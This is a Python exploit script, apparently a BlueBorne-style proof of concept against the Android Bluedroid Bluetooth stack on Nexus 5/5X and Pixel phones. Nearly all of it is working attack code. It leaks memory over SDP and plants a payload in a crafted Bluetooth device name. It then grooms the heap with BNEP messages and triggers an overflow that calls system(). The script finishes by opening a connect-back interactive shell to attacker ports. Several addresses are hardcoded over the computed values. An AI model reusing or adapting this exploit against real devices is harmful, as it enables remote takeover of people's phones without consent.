import os
import sys
import time
import struct
import select
import binascii

import bluetooth
from bluetooth import _bluetooth as bt

import bluedroid
import connectback

from pwn import log


# Listening TCP ports that need to be opened on the attacker machine
NC_PORT = 1233
STDOUT_PORT = 1234
STDIN_PORT = 1235


# Exploit offsets work for these (exact) libs:

# bullhead:/ # sha1sum /system/lib/hw/bluetooth.default.so
# 8a89cadfe96c0f79cdceee26c29aaf23e3d07a26  /system/lib/hw/bluetooth.default.so
# bullhead:/ # sha1sum /system/lib/libc.so
# 0b5396cd15a60b4076dacced9df773f75482f537  /system/lib/libc.so

# For Pixel 7.1.2 patch level Aug/July 2017
#LIBC_TEXT_STSTEM_OFFSET = 0x45f80 + 1 - 56 # system + 1
#LIBC_SOME_BLX_OFFSET = 0x1a420 + 1 - 608 # eventfd_write + 28 + 1

# Nexus 5 6.0.1
#LIBC_TEXT_STSTEM_OFFSET = 0x1fff0+ 1 # system + 1
LIBC_TEXT_STSTEM_OFFSET = 0x46b4d + 1
LIBC_SOME_BLX_OFFSET = 0x9f9

# For Nexus 5X 7.1.2 patch level Aug/July 2017
#LIBC_TEXT_STSTEM_OFFSET = 0x45f80 + 1
#LIBC_SOME_BLX_OFFSET = 0x1a420 + 1

# Aligned to 4 inside the name on the bss (same for both supported phones)
#BSS_ACL_REMOTE_NAME_OFFSET = 0x202ee4
#BLUETOOTH_BSS_SOME_VAR_OFFSET = 0x14b244

# Nexus 5 6.0.1
#BSS_ACL_REMOTE_NAME_OFFSET = 0x20450c

BSS_ACL_REMOTE_NAME_OFFSET = 0xacfd54ec
BLUETOOTH_BSS_SOME_VAR_OFFSET = 0x13e721

MAX_BT_NAME = 0xf5

# Payload details (attacker IP should be accessible over the internet for the victim phone)
SHELL_SCRIPT = b'touch /tmp/test'


PWNING_TIMEOUT = 8
BNEP_PSM = 15
PWN_ATTEMPTS = 1
LEAK_ATTEMPTS = 1

def print_result(result):
    i = 0
    for line in result:
      sys.stdout.write("%02d: " % i)
      for x in line:
        sys.stdout.write("%08x " % x) 
      else:
        sys.stdout.write("\n")
        i += 1


def set_bt_name(payload, src_hci, src, dst):
    # Create raw HCI sock to set our BT name
    raw_sock = bt.hci_open_dev(bt.hci_devid(src_hci))
    flt = bt.hci_filter_new()
    bt.hci_filter_all_ptypes(flt)
    bt.hci_filter_all_events(flt)
    raw_sock.setsockopt(bt.SOL_HCI, bt.HCI_FILTER, flt)

    # Send raw HCI command to our controller to change the BT name (first 3 bytes are padding for alignment)
    raw_sock.sendall(binascii.unhexlify('01130cf8cccccc') + payload.ljust(MAX_BT_NAME, b'\x00'))
    raw_sock.close()
    #time.sleep(1)
    time.sleep(0.1)

    # Connect to BNEP to "refresh" the name (does auth)
    bnep = bluetooth.BluetoothSocket(bluetooth.L2CAP)
    bnep.bind((src, 0))
    bnep.connect((dst, BNEP_PSM))
    bnep.close()

    # Close ACL connection
    os.system('hcitool dc %s' % (dst,))
    #time.sleep(1)


def set_rand_bdaddr(src_hci):
    addr = ['%02x' % (ord(c),) for c in os.urandom(6)]
    # NOTW: works only with CSR bluetooth adapters!
    os.system('sudo bccmd -d %s psset -r bdaddr 0x%s 0x00 0x%s 0x%s 0x%s 0x00 0x%s 0x%s' %
              (src_hci, addr[3], addr[5], addr[4], addr[2], addr[1], addr[0]))
    final_addr = ':'.join(addr)
    log.info('Set %s to new rand BDADDR %s' % (src_hci, final_addr))
    #time.sleep(1)
    while bt.hci_devid(final_addr) < 0:
        time.sleep(0.1)
    return final_addr


def memory_leak_get_bases(src, src_hci, dst):
    prog = log.progress('Doing stack memeory leak...')

    # Get leaked stack data. This memory leak gets "deterministic" "garbage" from the stack.
    result = bluedroid.do_sdp_info_leak(dst, src)
    #print("Leak: %s" % result) # Debug, show leak array

    print_result(result)
    # Calculate according to known libc.so and bluetooth.default.so binaries
    #likely_some_libc_blx_offset = result[-3][-2]
    #likely_some_bluetooth_default_global_var_offset = result[6][0]

    # Nexus 5 6.0.1
    likely_some_libc_blx_offset = result[6][7]
    likely_some_bluetooth_default_global_var_offset = result[6][5]

    # Show leak address
    log.info("LIBC  0x%08x" % likely_some_libc_blx_offset)
    log.info("BT    0x%08x" % likely_some_bluetooth_default_global_var_offset)


    libc_text_base = likely_some_libc_blx_offset - LIBC_SOME_BLX_OFFSET


    bluetooth_default_bss_base = likely_some_bluetooth_default_global_var_offset - BLUETOOTH_BSS_SOME_VAR_OFFSET

    libc_text_base = 0xb59a0000
    bluetooth_default_bss_base = 0xacd5d000

    log.info('libc_base: 0x%08x, bss_base: 0x%08x' % (libc_text_base, bluetooth_default_bss_base))

    # Close SDP ACL connection
    os.system('hcitool dc %s' % (dst,))
    time.sleep(0.1)

    prog.success()
    return libc_text_base, bluetooth_default_bss_base


def pwn(src_hci, dst, bluetooth_default_bss_base, system_addr, acl_name_addr, my_ip, libc_text_base):
    # Gen new BDADDR, so that the new BT name will be cached
    src = set_rand_bdaddr(src_hci)

    # Payload is: '"\x17AAAAAAsysm";\n<bash_commands>\n#'
    # 'sysm' is the address of system() from libc. The *whole* payload is a shell script.
    # 0x1700 == (0x1722 & 0xff00) is the "event" of a "HORRIBLE_HACK" message.
    #payload = struct.pack('<III', 0x41411722, 0x41414141, system_addr) + b'";\n' + SHELL_SCRIPT.format(ip=my_ip, port=NC_PORT) + b'\n#'
    payload = struct.pack('<III', 0x41411722, 0x41414141, system_addr) + b'";\n' + SHELL_SCRIPT + b'\n#'


    # x -> payload address (name has 4 bytes of padding)
    x = acl_name_addr+4

    shell_addr = x+24 # SHELL SCRIPT address
    ptr0 = x+12 
    #ptr1 = x+12 
    #ptr2 = x+8 

    #shell_addr = 0x41414141
    #nop = asm.asm('nop', arch='thumb')
    #ptr0 = nop
    #print ptr0
    #ptr0 = 0x42424242
    #ptr1 = 0x43434343
    #ptr2 = 0x44444444
    #system_addr = 0x45454545

    #payload = 'A'+ struct.pack('<IIIIII', shell_addr, 0x41414141, ptr2, 0x42424242, ptr1, system_addr) + SHELL_SCRIPT.format(ip=my_ip, port=NC_PORT)
    #payload = 'A'+ struct.pack('<IIIIII', shell_addr, ptr1, ptr2, ptr0, ptr1, system_addr) + SHELL_SCRIPT.format(ip=my_ip, port=NC_PORT)
    #payload = 'A'+ struct.pack('<II', shell_addr, system_addr) + SHELL_SCRIPT.format(ip=my_ip, port=NC_PORT)

   # payload = struct.pack('<III', 0xAAAA1722, 0x41414141, system_addr) + b'";\n' + \
    #                      SHELL_SCRIPT.format(ip=my_ip, port=NC_PORT) + b'\n#'

   
    #log.info("shelladdr 0x%08x" % shell_addr)
    #log.info("ptr0      0x%08x" % ptr0)
    #log.info("ptr1      0x%08x" % ptr1)
    #log.info("ptr2      0x%08x" % ptr2)
    log.info("system    0x%08x" % system_addr)

    log.info("PAYLOAD %s" % payload)

    assert len(payload) < MAX_BT_NAME
    assert b'\x00' not in payload

    # Puts payload into a known bss location (once we create a BNEP connection).
    set_bt_name(payload, src_hci, src, dst)

    prog = log.progress('Connecting to BNEP again')

    bnep = bluetooth.BluetoothSocket(bluetooth.L2CAP)
    bnep.bind((src, 0))
    bnep.connect((dst, BNEP_PSM))

    prog.success()
    prog = log.progress('Pwning...')

    # Each of these messages causes BNEP code to send 100 "command not understood" responses.
    # This causes list_node_t allocations on the heap (one per reponse) as items in the xmit_hold_q.
    # These items are popped asynchronously to the arrival of our incoming messages (into hci_msg_q).
    # Thus "holes" are created on the heap, allowing us to overflow a yet unhandled list_node of hci_msg_q.
    for i in range(20):
        bnep.send(binascii.unhexlify('8109' + '800109' * 100))

    # Repeatedly trigger the vuln (overflow of 8 bytes) after an 8 byte size heap buffer.
    # This is highly likely to fully overflow over instances of "list_node_t" which is exactly
    # 8 bytes long (and is *constantly* used/allocated/freed on the heap).
    # Eventually one overflow causes a call to happen to "btu_hci_msg_process" with "p_msg"
    # under our control. ("btu_hci_msg_process" is called *constantly* with messages out of a list)
    for i in range(1000):
        # If we're blocking here, the daemon has crashed
        _, writeable, _ = select.select([], [bnep], [], PWNING_TIMEOUT)
        if not writeable:
            break
        bnep.send(binascii.unhexlify('810100') +
                  struct.pack('<II', 0, ptr0))
    else:
        log.info("Looks like it didn't crash. Possibly worked")

    prog.success()

def main(src_hci, dst, my_ip):
    os.system('hciconfig %s sspmode 0' % (src_hci,))
    os.system('hcitool dc %s' % (dst,))

    sh_s, stdin, stdout = connectback.create_sockets(NC_PORT, STDIN_PORT, STDOUT_PORT)

    for i in range(PWN_ATTEMPTS):
        log.info('Pwn attempt %d:' % (i,))

        # Create a new BDADDR
        src = set_rand_bdaddr(src_hci)
        set_bt_name("TEST", src_hci, src, dst) # Set Name, REMOTE_NAME address search

        # Try to leak section bases
        #for j in range(LEAK_ATTEMPTS):
        #    libc_text_base, bluetooth_default_bss_base = memory_leak_get_bases(src, src_hci, dst)
        #    if (libc_text_base & 0xfff == 0) and (bluetooth_default_bss_base & 0xfff == 0):
        #        break
        #else:
        #   assert True
           #assert False, "Memory doesn't seem to have leaked as expected. Wrong .so versions?"

        libc_text_base = 0xb43f7000
        bluetooth_default_bss_base =0xacd8f000

        system_addr = LIBC_TEXT_STSTEM_OFFSET + libc_text_base
        system_addr =  0xb4fadb66 
        acl_name_addr = BSS_ACL_REMOTE_NAME_OFFSET + bluetooth_default_bss_base
        acl_name_addr = 0x9afa34ec
        #assert acl_name_addr % 4 == 0
        log.info('system: 0x%08x, acl_name: 0x%08x' % (system_addr, acl_name_addr))

        pwn(src_hci, dst, bluetooth_default_bss_base, system_addr, acl_name_addr, my_ip, libc_text_base)
        # Check if we got a connectback
        readable, _, _ = select.select([sh_s], [], [], PWNING_TIMEOUT)
        if readable:
            log.info('Done')
            break

    else:
        assert False, "Pwning failed all attempts"

    connectback.interactive_shell(sh_s, stdin, stdout, my_ip, STDIN_PORT, STDOUT_PORT)


if __name__ == '__main__':
    main(*sys.argv[1:])

